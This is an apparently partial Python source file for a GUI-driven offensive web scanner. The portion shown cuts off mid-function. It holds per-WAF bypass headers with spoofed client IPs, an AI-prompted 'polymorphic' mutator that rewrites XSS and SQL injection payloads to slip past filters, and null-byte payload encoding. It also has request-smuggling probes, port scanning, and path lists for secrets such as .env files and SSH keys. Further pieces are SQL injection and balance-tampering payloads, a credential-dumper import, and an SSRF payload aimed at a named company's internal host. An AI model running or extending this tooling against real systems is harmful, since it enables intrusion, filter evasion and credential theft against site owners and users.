import asyncio
import aiohttp
import string
import re
import random
import os
import time
from typing import List, Dict, Any, Optional, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from PySide6.QtCore import QObject, Signal
import dns.resolver
import tldextract
import whois
from bs4 import BeautifulSoup
import lxml
from fake_useragent import UserAgent

try:
    from .models import Vulnerability, Target
    from .enumerator import SubdomainEnumerator, UberRecon, HackerTargetEnumerator
    from .crawler import WebCrawler
    from .payloads import Payloads, Indicators
    from .payloads import Payloads, Indicators
    from core.browser_scanner import BrowserScanner
    from .proxy_manager import ProxyManager
    from .dumper import CredentialDumper
except ImportError:
    from core.models import Vulnerability, Target
    from core.enumerator import SubdomainEnumerator, UberRecon, HackerTargetEnumerator
    from core.crawler import WebCrawler
    from core.payloads import Payloads, Indicators
    from core.payloads import Payloads, Indicators
    from core.browser_scanner import BrowserScanner
    from core.proxy_manager import ProxyManager
    from core.dumper import CredentialDumper

# Import CVEScanner globally (or handle import error properly if module missing)
try:
    from .cve_scanner import CVEScanner
except ImportError:
    from core.cve_scanner import CVEScanner

H1_USER = "MoisesVanti-sectest" 
SSRF_PAYLOAD = f"http://dca11-pra.prod.uber.internal:31084/{H1_USER}@wearehackerone.com"

class AdaptiveConcurrencyController:
    """Dynamically manages request concurrency based on target health and latency."""
    def __init__(self, initial_limit=10, min_limit=2, max_limit=100):
        self.limit: int = initial_limit
        self.min_limit: int = min_limit
        self.max_limit: int = max_limit
        self.sem: asyncio.Semaphore = asyncio.Semaphore(self.limit)
        self.latency_baseline: Optional[float] = None
        self.success_streak: int = 0
        self.lock: asyncio.Lock = asyncio.Lock()
        
    async def adjust(self, status, latency):
        async with self.lock:
            # Handle throttles/blocks (429/403)
            if status in [429, 403]:
                self.success_streak = 0
                new_limit = max(self.min_limit, int(self.limit * 0.5))
                if new_limit != self.limit:
                    self.limit = new_limit
                    self.sem = asyncio.Semaphore(self.limit)
                return "THROTTLE"
            
            # Handle latency spikes
            if self.latency_baseline is not None:
                baseline = self.latency_baseline # Use local variable for type stability
                if latency > baseline * 2.5:
                    self.success_streak = 0
                    self.limit = max(self.min_limit, int(self.limit * 0.7))
                    self.sem = asyncio.Semaphore(self.limit)
                    return "LATENCY_BACKOFF"
            
            # Slow scale up on success
            if status == 200:
                self.success_streak += 1
                if self.success_streak >= 20 and self.limit < self.max_limit:
                    self.limit += 2
                    self.sem = asyncio.Semaphore(self.limit)
                    self.success_streak = 0
                    return "SCALE_UP"
                
            # Update latency baseline
            current_baseline = self.latency_baseline
            if current_baseline is None:
                self.latency_baseline = float(latency)
            else:
                self.latency_baseline = (current_baseline * 0.9) + (float(latency) * 0.1)
                
            return "STABLE"

class NeuralWAFProfiler:
    """Heuristic WAF identification and evasion strategy selector."""
    def __init__(self):
        self.signatures = {
            "Cloudflare": ["cf-ray", "__cf_bm", "cf-cache-status", "expect-ct"],
            "Akamai": ["x-akamai-transformed", "akamai-origin-hop", "x-edgeconnect-midmile-rtt", "x-akamai-pragma-client-iptime"],
            "AWS WAF": ["x-amz-cf-id", "x-amz-request-id", "x-amzn-requestid", "awswaf"],
            "Imperva": ["x-iinfo", "incap-ses", "visid_incap", "x-cdn"],
            "F5 BIG-IP": ["x-cnection", "bigipserver", "f5-vip", "x-f5-auth-token"],
            "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
            "Azure WAF": ["x-msedge-ref", "x-azure-ref", "x-ms-ref", "azure-waf"],
            "Google Cloud Armor": ["x-cloud-trace-context", "x-goog-authenticated-user-id"],
            "FortiWeb": ["fortiwafsid"],
            "ModSecurity": ["x-mod-security", "mod_security-message", "mod_security-id"],
            "Barracuda": ["barra_counter_scope", "bnai-status"],
            "Citrix NetScaler": ["ns_af", "citrix_adc_id", "pw_id"],
            "Wallarm": ["x-wallarm-id", "wallarm-request-id"],
            "Radware AppWall": ["x-sl-compid", "x-radware-device"],
            "Palo Alto Networks": ["x-pan-id", "pan-waf-status"],
            "Check Point": ["x-checkpoint-id", "cp-waf-event"],
            "Sophos": ["x-sophos-id", "sophos-waf-blocked"],
            "Reblaze": ["x-reblaze-id", "rbz-waf-status"],
            "Fastly / Signal Sciences": ["x-sigsci-event", "x-sigsci-tags"],
            "StackPath": ["x-sp-request-id", "x-stackpath-request-id"],
            "Alibaba Cloud": ["ali-cloud-waf", "x-ali-waf-request-id"],
            "Tencent Cloud": ["t-waf-id", "x-tc-waf-request-id"],
            "DenyALL": ["sessionid-denyall", "denyall-cookie"],
            "Wordfence": ["wfvt_", "wordfence_verified_human"],
            "CDNetworks": ["x-cdn-publish", "x-cdn-request-id"],
            "GoDaddy WAF": ["x-sucuri-id", "sucuri_cloudproxy_uuid"],
            "SiteLock": ["sitelock-site-id", "x-sl-request-id"],
            "BitNinja": ["x-bitninja-proxy", "bitninja-id"],
            "Comodo cWAF": ["x-comodo-waf-id"],
            "NSFocus": ["nsfocus"],
            "Sangfor": ["sangfor"],
            "Viettel": ["viettel-waf"],
            "Airtel WAF": ["x-airtel-waf"]
        }
        self.target_profiles = {}

    def profile(self, host, r_headers):
        headers_lower = {k.lower(): str(v).lower() for k, v in r_headers.items()}
        for waf, sigs in self.signatures.items():
            if any(sig in headers_lower for sig in sigs):
                self.target_profiles[host] = waf
                return waf
        return "Unknown/None"

    def get_evasion_headers(self, host):
        waf = self.target_profiles.get(host)
        headers = {}
        # Base evasion headers (works for many)
        headers.update({
            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Real-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "Forwarded": f"for={random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)};proto=https",
            "Via": "1.1 google",
            "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        })

        if waf == "Cloudflare":
            headers.update({
                "CF-Visitor": '{"scheme":"https"}',
                "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "NL", "SG"]),
                "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none"
            })
        elif waf == "Akamai":
            headers.update({
                "Pragma": "akamai-x-get-client-ip, akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key",
                "X-Akamai-Pragma-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            })
        elif waf == "F5 BIG-IP":
            headers.update({
                "X-WA-Info": f"[V2.1 Nexus Bypass - Attempt {random.randint(100,999)}]",
                "X-Forwarded-For": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1"
            })
        elif waf == "Imperva":
            headers.update({
                "X-Forwarded-For": "127.0.0.1",
                "Incap-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            })
        elif waf == "Azure WAF":
            headers.update({
                "X-ARR-SSL": "true",
                "X-Original-URL": "/",
                "X-Forwarded-Proto": "https",
                "X-AppService-Proto": "https"
            })
        elif waf == "Fastly":
            headers.update({
                "Fastly-FF": "true",
                "X-Fastly-Request-ID": os.urandom(16).hex(),
                "Fastly-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            })
        elif waf == "Google Cloud Armor":
            headers.update({
                "X-Cloud-Trace-Context": f"{random.getrandbits(64):x}",
                "X-Goog-Authenticated-User-ID": "admin-v7-nexus"
            })
        elif waf == "Barracuda":
            headers.update({
                "X-ASL-Bypass": "True",
                "X-Barracuda-Bypass": "1"
            })
        elif waf == "Citrix NetScaler":
            headers.update({
                "X-Citrix-Bypass": "Enabled",
                "X-NS-Client-IP": "127.0.0.1"
            })
        elif waf == "Wallarm":
            headers.update({
                "X-Wallarm-Node-ID": "nexus-trusted-node",
                "X-Forwarded-For": "127.0.0.1"
            })
        elif waf == "Signal Sciences": # This covers "Fastly / Signal Sciences"
            headers.update({
                "X-SigSci-No-WAF": "1",
                "X-SigSci-Bypass": "True"
            })
        elif waf == "Alibaba Cloud":
            headers.update({
                "Ali-Waf-Ignore": "true",
                "X-Ali-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            })
        elif waf == "FortiWeb":
            headers.update({
                "X-FortiWeb-Request-ID": os.urandom(8).hex(),
                "Fortiwafsid": os.urandom(16).hex()
            })
        elif waf == "ModSecurity":
            # ModSecurity often blocks based on specific header patterns
            headers.update({
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1"
            })
        return headers

class ContextualPolymorphicAI:
    """
    Generates advanced, context-aware payloads to bypass WAFs and filters.
    Uses the AIAssistant to mutate common payloads based on the target technology stack.
    """
    def __init__(self, ai_assistant):
        self.ai = ai_assistant
        self.payload_cache: Dict[str, str] = {}
        self.mutation_history: List[Dict] = []

    async def mutate_payload(self, base_payload: str, context: str, waf: str = "Unknown") -> str:
        """Mutates a payload using AI to bypass filters found in the context."""
        if not self.ai:
            return str(base_payload)
            
        cache_key = f"{base_payload}:{context}:{waf}"
        if cache_key in self.payload_cache:
            return str(self.payload_cache[cache_key])

        prompt = f"""
        [CONTEXTUAL POLYMORPHIC MUTATION]
        BASE PAYLOAD: {base_payload}
        TARGET CONTEXT: {context}
        DETECTED WAF: {waf}
        
        TASK: Mutate the BASE PAYLOAD to bypass filters likely present in the TARGET CONTEXT and for the DETECTED WAF.
        REQUIREMENTS:
        1. Maintain the original vulnerability trigger (e.g. alert(1), OR 1=1).
        2. Use advanced encoding (hex, octal, unicode), comment injection, or syntax tricks.
        3. The result MUST be a single line, ready for injection.
        4. Return ONLY the mutated payload.
        """
        
        try:
            # Using deep_attack_chain as a mutation engine
            response = await self.ai.deep_attack_chain(prompt)
            mutated = str(response)
            if mutated and len(mutated) < 1000:
                self.payload_cache[cache_key] = mutated
                self.mutation_history.append({"base": base_payload, "mutated": mutated, "context": context, "waf": waf})
                return mutated
        except:
            pass
            
        return str(base_payload) # Fallback

class NexusScanner(QObject):
    finding_found = Signal(object)
    log_message = Signal(str)
    progress_updated = Signal(int)
    stats_updated = Signal(int, int, int)
    scan_finished = Signal()
    sensitive_data_found = Signal(str, str)
    payload_generated = Signal(str, str)

    def __init__(self, targets: list[dict], deep_scan=False, bypass_mode=False, 
                 headless=True, proxychains=False, strict_validation=True, 
                 dynamic_timeout=False, ai_key=None, 
                 ai_model="llama3-70b-8192", 
                 heuristic_mining=False, governor_mode=False, **kwargs):
        super().__init__()
        self.targets = targets
        self.deep_scan = deep_scan
        self.bypass_mode = bypass_mode
        self.headless = headless
        self.proxychains = proxychains
        self.strict_validation = strict_validation
        self.dynamic_timeout = dynamic_timeout
        self.heuristic_mining = heuristic_mining 
        self.ai_key = ai_key
        self.ai_model = ai_model or "llama3-70b-8192"
        self.governor_mode = governor_mode
        
        # UI Bypass Integration Options
        self.ip_rotation = kwargs.get('ip_rotation', False)
        self.waf_evasion = kwargs.get('waf_evasion', False)
        self.req_smuggle = kwargs.get('req_smuggle', False)
        self.ssl_strip = kwargs.get('ssl_strip', False)
        self.dom_polling = kwargs.get('dom_polling', False)
        self.error_bypass = kwargs.get('error_bypass', False)
        self.payload_encode = kwargs.get('payload_encode', False)
        
        # New Efficiency & Stealth options
        self.active_403_bypass = kwargs.get('active_403_bypass', False)
        self.header_rotation = kwargs.get('header_rotation', False)
        self.auto_tune = kwargs.get('auto_tune', False)
        
        self.is_running = False
        self.discovered_forms = [] # Initialize to empty list
        self.session = None
        self.ua = UserAgent()
        self.proxy_manager = ProxyManager()
        self.dumper = CredentialDumper()
        
        # AI Assistant
        self.ai_assistant = None
        if ai_key:
            from core.ai_assistant import AIAssistant
            self.ai_assistant = AIAssistant(ai_key, model=ai_model or "llama3-70b-8192")
            self.ai_assistant.log_message.connect(self.log_message.emit)
        
        # Stats
        self.total_findings = 0
        self.critical_findings = 0
        self.request_count = 0
        
        # Heuristic WAF Profiling
        self._waf_bypass_stats = {
            'url_encode': 1,
            'double_url_encode': 1,
            'html_entity': 1,
            'script_camel': 1,
            'quotes_hex': 1,
            'plain': 1
        }
        
        # Deduplication
        self.emitted_hashes = set()
        
        # Concurrency Control (Surreal Upgrades)
        self.acc = AdaptiveConcurrencyController()
        self.waf_profiler = NeuralWAFProfiler()
        # Initialize polymorphic_ai after ai_assistant is potentially set
        self.polymorphic_ai = ContextualPolymorphicAI(self.ai_assistant) if self.ai_assistant else None
        self.sem = self.acc.sem # Fallback for old code

        self.sensitive_paths = [
            # Git & SCM
            ".git/config", ".git/HEAD", ".git/index", ".gitignore", ".gitlab-ci.yml",
            # Environment & Configs
            ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
            "config.php", "wp-config.php", "configuration.php", "LocalSettings.php",
            "config.json", "config.yml", "database.yml", "settings.py",
            "appsettings.json", "web.config",
            # Backups & Dumps
            "backup.sql", "dump.sql", "database.sql", "users.sql", "db_backup.sql",
            "backup.zip", "site.zip", "www.zip", "backup.tar.gz", "old.zip",
            # SSH & Keys
            "id_rsa", "id_dsa", ".ssh/id_rsa", ".ssh/authorized_keys", "server.key",
            # Logs & Debug
            "debug.log", "error.log", "access.log", "npm-debug.log", "phpinfo.php",
            "server-status", "trace.axd", "elmah.axd",
            # Framework Specific
            "composer.json", "composer.lock", "package.json", "package-lock.json",
            "requirements.txt", "Gemfile", "Gemfile.lock", "webpack.config.js",
            ".vscode/sftp.json", ".idea/workspace.xml", "docker-compose.yml",
            "Dockerfile", "Makefile", "Jenkinsfile"
        ]

    def get_headers(self):
        try:
            # Dynamic header rotation feature
            if getattr(self, 'header_rotation', False):
                user_agent = self.ua.random
            else:
                # Cache a single fake UA if rotation is off to reduce fingerprinting noise
                if not hasattr(self, '_cached_ua'):
                    self._cached_ua = self.ua.random
                user_agent = getattr(self, '_cached_ua', f"Nexus-Ultima-v20/{random.randint(100,999)}")
        except:
            user_agent = f"Nexus-Ultima-v20/{random.randint(100,999)}"

        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        if self.bypass_mode or getattr(self, 'header_rotation', False):
            # ADVANCED HEADER SPOOFING
            spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers.update({
                "X-Forwarded-For": spoofed_ip,
                "X-Originating-IP": spoofed_ip,
                "X-Remote-IP": spoofed_ip,
                "X-Remote-Addr": spoofed_ip,
                "X-Client-IP": spoofed_ip,
                "X-Host": spoofed_ip,
                "X-Forwared-Host": spoofed_ip,
                "Referer": "https://www.google.com/",
                "X-Waf-Bypass": "true" # Sometimes works on weak configs
            })
            if getattr(self, 'governor_mode', False):
                headers.update({
                    "X-Requested-With": "XMLHttpRequest",
                    "DNT": "1",
                    "Cache-Control": "max-age=0, no-cache",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "cross-site",
                    "Priority": "u=0, i",
                    "Pragma": "no-cache",
                    "X-Forwarded-Host": f"{random.choice(string.ascii_lowercase)}.example.com",
                    "X-Host": spoofed_ip,
                    "True-Client-IP": spoofed_ip,
                    # Extremo Anti-Bot Mitigation (Cloudflare / Datadome)
                    "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'X-Original-URL': urlparse(getattr(self, '_current_url', '/')).path,
                    'X-Rewrite-URL': urlparse(getattr(self, '_current_url', '/')).path,
                    'X-Custom-IP-Authorization': '127.0.0.1'
                })
        
        # [MILITARY-GRADE EVASION] Random Internal/External IP Spoofing
        if self.waf_evasion or self.header_rotation:
            # Generate diverse sets of fake IPv4 spaces
            fake_ips = [
                f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
                f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
                f"127.0.0.{random.randint(1,254)}",
                f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ]
            spoofed_ip = random.choice(fake_ips)
            
            headers.update({
                'X-Forwarded-For': spoofed_ip,
                'X-Originating-IP': spoofed_ip,
                'X-Remote-IP': spoofed_ip,
                'X-Remote-Addr': spoofed_ip,
                'X-Client-IP': spoofed_ip,
                'X-Host': '127.0.0.1',
                'CF-Connecting-IP': spoofed_ip,
                'True-Client-IP': spoofed_ip,
                'Client-IP': spoofed_ip,
                'Forwarded': f'for={spoofed_ip};by=127.0.0.1;host=localhost'
            })
            
        return headers
            
    async def analyze_js_files(self, url):
        """Crawls and mines JS files for secrets and endpoints."""
        try:
            status, content, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
            if not content: return
            
            soup = await asyncio.to_thread(BeautifulSoup, content, 'lxml')
            scripts = [s.get('src') for s in soup.find_all('script') if s.get('src')]
            
            for script in scripts:
                if not script.startswith('http'):
                    base = url.split('?')[0].rstrip('/')
                    # Handle relative paths properly
                    if script.startswith('/'):
                        parsed = urlparse(url)
                        script_url = f"{parsed.scheme}://{parsed.netloc}{script}"
                    else:
                        script_url = f"{base}/{script}"
                else:
                    script_url = script

                # Filter external libs to save time (optional, but good for speed)
                if "jquery" in script_url or "bootstrap" in script_url or "google-analytics" in script_url:
                    continue

                status, js_content, headers, latency = await self._safe_request('GET', script_url, headers=self.get_headers())
                if status == 200 and js_content:
                     js_text = js_content.decode('utf-8', errors='ignore')
                     
                     # Extract Secrets (Regex expanded)
                     self.extract_sensitive_data(js_text, script_url)
                     
                     # Extract Endpoints
                     endpoints = set(re.findall(r'["\'](/api/[a-zA-Z0-9_\-/]+|/v[0-9]/[a-zA-Z0-9_\-/]+)["\']', js_text))
                     if endpoints:
                          self.log_message.emit(f"<span style='color:#ffcc00'>[JS] Found {len(endpoints)} hidden endpoints in {os.path.basename(script_url)}</span>")
                          # Save endpoints evidence
                          self.save_evidence(script_url, "JS_Endpoints", "\n".join(endpoints))

        except Exception:
            pass

    async def check_takeover(self, domain):
         """Checks for Subdomain Takeover opportunities via CNAME analysis."""
         try:
             answers = dns.resolver.resolve(domain, 'CNAME')
             for rdata in answers:
                 cname = rdata.target.to_text().rstrip('.')
                 
                 # Known Takeover Fingerprints
                 fingerprints = {
                     "github.io": "There is no GitHub Pages site here",
                     "herokuapp.com": "Heroku | No such app",
                     "amazonaws.com": "The specified bucket does not exist",
                     "azurewebsites.net": "404 Web Site not found",
                     "cloudapp.net": "404 Web Site not found",
                     "wordpress.com": "Do you want to register"
                 }
                 
                 for service_domain, error_sig in fingerprints.items():
                     if service_domain in cname:
                         # Verify if it's dangling
                         # We need to make a request to the domain seeing if it returns the error
                         try:
                             async with self.session.get(f"http://{domain}", timeout=5) as r:
                                 content = await r.text()
                                 if error_sig in content:
                                      vuln = Vulnerability(
                                          target=domain, 
                                          vuln_type="Subdomain Takeover", 
                                          severity="CRITICAL", 
                                          impact=f"Dangling CNAME to {cname}",
                                          comando_direto=f"nslookup {domain}"
                                      )
                                      self._emit_finding(vuln)
                                      self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: SUBDOMAIN TAKEOVER Possible on {domain} (-> {cname})</span>")
                         except Exception as e:
                             self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] Takeover check failed for {cname}: {str(e)}</span>")
         except Exception as e:
             self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] DNS resolution failed for takeover check on {domain}: {str(e)}</span>")

    async def mine_parameters(self, url):
        """Attempts to find hidden debug parameters."""
        params = ["debug", "test", "admin", "admin_mode", "show_errors", "source", "env"]
        
        # Determine baseline size
        base_status, base_content, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
        base_len = len(base_content)
        
        for param in params:
             # Try ?param=true
             fuzz_url = f"{url}?{param}=true" if "?" not in url else f"{url}&{param}=true"
             status, content, headers, latency = await self._safe_request('GET', fuzz_url, headers=self.get_headers())
             
             # Heuristic: Significant size change or 500/error
             if abs(len(content) - base_len) > 500 and status == 200:
                  self.log_message.emit(f"<span style='color:#ffcc00'>[?] Suspicious behavior with parameter '{param}' on {url}</span>")

    async def check_waf(self, url):
        """Detects WAF presence via headers using NeuralWAFProfiler."""
        try:
            # Fast check
            status, _, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
            
            detected_waf = self.waf_profiler.profile(urlparse(url).netloc, headers)
            
            if detected_waf != "None":
                msg = f"<span style='color:#ff0055'>[!] WAF DETECTED: {detected_waf}</span>"
                self.log_message.emit(msg)
                if self.bypass_mode:
                     self.log_message.emit(f"<span style='color:#00ff9d'>[+] ATTEMPTING EVASION PROTOCOLS...</span>")
            else:
                 self.log_message.emit("<span style='color:#aaa'>[-] No common WAF Detected.</span>")
                 
        except Exception:
            pass

    async def execute_request_smuggling(self, url):
        """HTTP Request Smuggling (CL.TE / TE.CL) Core Architecture Module."""
        if not self.req_smuggle: return
        
        try:
            self.log_message.emit(f"<span style='color:#8a2be2'>[⚡] Analyzing Request Smuggling (CL.TE / TE.CL) on {url}...</span>")
            
            # 1. Base check for desync susceptibility
            # We send a request with both CL and TE effectively poisoning some proxies
            # This is a passive-aggressive probing method
            payload = "0\r\n\r\n"
            headers = self.get_headers()
            headers.update({
                'Transfer-Encoding': 'chunked',
                'Content-Length': str(len(payload) + 5) # Discrepancy
            })
            
            async with self.session.post(url, data=payload, headers=headers, timeout=5) as r:
                if r.status == 500 or r.status == 400:
                    self.log_message.emit(f"<span style='color:#ff0055'>[!] Smuggling Alert: Target returned {r.status} on desync probe. Possible CL.TE!</span>")
                    vuln = Vulnerability(
                        target=url, 
                        vuln_type="HTTP Request Smuggling Probe", 
                        severity="HIGH", 
                        impact="Load Balancer Desynchronization potential detected",
                        comando_direto=f"curl -v -X POST -H \"Transfer-Encoding: chunked\" -H \"Content-Length: 5\" --data \"0\\r\\n\\r\\n\" {url}"
                    )
                    self._emit_finding(vuln)
                else:
                    self.log_message.emit(f"<span style='color:#aaa'>[⚡] Smuggling analysis complete. No immediate desync detected.</span>")
        except Exception as e:
            pass
            
    def apply_waf_evasion(self, payload):
        """Mutates payloads using Hex, NullBytes, and Unicode to bypass Cloudflare/AWS WAF."""
        if not self.waf_evasion: return payload
        
        # Example: Mutating <script> to %3Cscript%3E or adding null bytes
        mutated = payload.replace("<", "%3C").replace(">", "%3E")
        mutated = mutated.replace("script", "scr%00ipt")
        mutated = mutated.replace("SELECT", "S%00E%00L%00E%00C%00T")
        
        return mutated
            
    async def scan_ports(self, hostname):
        """Scans top 100 critical ports with banner grabbing."""
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Initiating Service Discovery (Top 100 Ports)...</span>")
        # Extended port list
        # Extended port list (Top 1000 + Critical Services)
        ports = list(range(20, 1025)) + [
            1433, 1521, 2082, 2083, 2086, 2087, 2095, 2096, 
            2222, 3306, 3389, 3690, 4000, 5000, 5432, 5601, 5900, 
            6000, 6379, 7000, 8000, 8001, 8008, 8080, 8081, 8443, 
            8888, 9000, 9090, 9200, 9300, 10000, 11211, 27017
        ]
        ports = sorted(list(set(ports))) # Remove duplicates
        
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Scanning {len(ports)} ports (Standard 1000 + Critical)...</span>")
        open_ports = []
        
        async def check_port(port):
            try:
                fut = asyncio.open_connection(hostname, port)
                reader, writer = await asyncio.wait_for(fut, timeout=2.0)
                
                # Banner Grabbing attempt
                banner = ""
                try:
                    # Send bytes to trigger response for some protocols
                    if port not in [80, 443]:
                         writer.write(b"\r\n\r\n")
                         await writer.drain()
                         data = await asyncio.wait_for(reader.read(1024), timeout=1.5)
                         banner = data.decode('utf-8', errors='ignore').strip()
                except:
                    pass

                open_ports.append((port, banner))
                writer.close()
                await writer.wait_closed()
            except:
                pass

        # Batch scan
        batch_size = 500 # Massively increased batch size for governmental level scanning speed
        for i in range(0, len(ports), batch_size):
             batch = ports[i:i+batch_size]
             if not self.is_running: break
             await asyncio.gather(*[check_port(p) for p in batch])
        
        if open_ports:
            self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(open_ports)} OPEN PORTS:</span>")
            
            PORT_MAP = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 
                80: "HTTP", 110: "POP3", 111: "RPCBind", 135: "MSRPC", 139: "NetBIOS",
                143: "IMAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 514: "Syslog",
                587: "SMTP (Submission)", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
                1521: "Oracle DB", 2082: "cPanel", 2083: "cPanel (SSL)", 2086: "WHM",
                2087: "WHM (SSL)", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
                5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
                9200: "Elasticsearch", 27017: "MongoDB"
            }
            
            for p, banner in sorted(open_ports, key=lambda x: x[0]):
                 service = PORT_MAP.get(p, "UNKNOWN")
                 output = f"    - Port {p}/tcp OPEN ({service})"
                 if banner:
                      output += f" | Banner: {banner[:40]}..."
                 self.log_message.emit(f"<span style='color:#aaa'>{output}</span>")
        else:
            self.log_message.emit(f"<span style='color:#aaa'>[-] No common open ports found (Firewalled?).</span>")

    async def enumerate_subdomains(self, domain):
        """Queries crt.sh for real subdomain enumeration."""
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Querying Certificate Transparency Logs (crt.sh)...</span>")
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        self.subdomains = set() # Initialize subdomains set
        
        for attempt in range(3):
            try:
                async with self.session.get(url, timeout=15) as r:
                    if r.status == 200:
                        data = await r.json()
                        subs = set()
                        for entry in data:
                            name_value = entry.get('name_value', '')
                            for sub in name_value.split('\n'):
                                if sub and not '*' in sub and sub != domain:
                                    subs.add(sub)
                        
                        if subs:
                            self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(subs)} SUBDOMAINS (CRT.SH):</span>")
                            # Limit output to top 15 to avoid flood
                            for sub in list(subs)[:15]:
                                 self.log_message.emit(f"<span style='color:#aaa'>    - {sub}</span>")
                                 self.subdomains.add(sub)
                                 # Check Takeover on discover
                                 asyncio.create_task(self.check_takeover(sub))
                                 
                            if len(subs) > 15:
                                 self.log_message.emit(f"<span style='color:#aaa'>    - ... and {len(subs)-15} more.</span>")
                            
                            # Save subdomains evidence
                            self.save_evidence(f"https://{domain}", "Subdomain_Recon_CRT", "\n".join(sorted(subs)))
                        else:
                            self.log_message.emit("<span style='color:#aaa'>[-] No subdomains found in CT logs.</span>")
                        
                        return # Success found (either subs or empty list but valid response)
                    else:
                        self.log_message.emit(f"<span style='color:#ff0055'>[!] CRT.SH API request failed (Status: {r.status}). Retrying ({attempt+1}/3)...</span>")
            except Exception:
                 if attempt < 2:
                      await asyncio.sleep(2)
                 else:
                      self.log_message.emit("<span style='color:#aaa'>[!] Failed to contact CRT.SH after 3 attempts. Skipping.</span>")

    async def check_balance_tampering(self, url):
        """Checks for API vulnerabilities related to balance/wallet manipulation."""
        # This is a heuristic check for endpoints that might accept 'amount' params
        payloads = [
            ("amount", "-1000"), # Negative value
            ("price", "0.01"), # Price manipulation
            ("credits", "999999"), # Overflow
            ("wallet_id", "' OR 1=1 --") # SQLi on ID
        ]
        
        base = url.split("?")[0]
        # Common API paths to check
        api_paths = ["/api/v1/wallet", "/api/balance", "/api/user/update", "/api/payment"]
        
        parsed = urlparse(url)
        root_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in api_paths:
             target = f"{root_url}{path}"
             for param, val in payloads:
                 # Construct JSON body attempt
                 json_body = {param: val}
                 try:
                     async with self.session.post(target, json=json_body, headers=self.get_headers(), timeout=3) as r:
                         if r.status in [200, 201]:
                             content = await r.read()
                             if b"success" in content or b"updated" in content:
                                  vuln_name = "Potential Logic Flaw (Balance Tampering)"
                                  self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: {vuln_name} at {target}</span>")
                 except Exception:
                     pass

    async def check_cache_deception(self, url):
        """Checks for Web Cache Deception vulnerability."""
        if not self.active_403_bypass: return # Reuse this toggle or add new one
        
        # Test paths likely to be cached if they look like static files
        test_extensions = [".css", ".js", ".jpg", ".png", ".svg", ".ico"]
        parsed = urlparse(url)
        
        # We only test paths that look like they might return sensitive user data (e.g. /account, /api/user)
        if any(x in parsed.path.lower() for x in ["account", "user", "profile", "settings", "api"]):
            self.log_message.emit(f"<span style='color:#00ff9d'>[Governor] Testing Web Cache Deception on {url}...</span>")
            for ext in test_extensions:
                deception_url = f"{url.rstrip('/')}/test{ext}"
                status, content, headers, _ = await self._safe_request('GET', deception_url)
                
                # If the server returns 200 and the content looks like HTML (not a real static file)
                # and it's being cached (check headers)
                cache_status = headers.get('X-Cache', '').lower() or headers.get('CF-Cache-Status', '').lower()
                if status == 200 and b"<html" in content.lower():
                    if any(x in cache_status for x in ["hit", "miss", "revalidate"]):
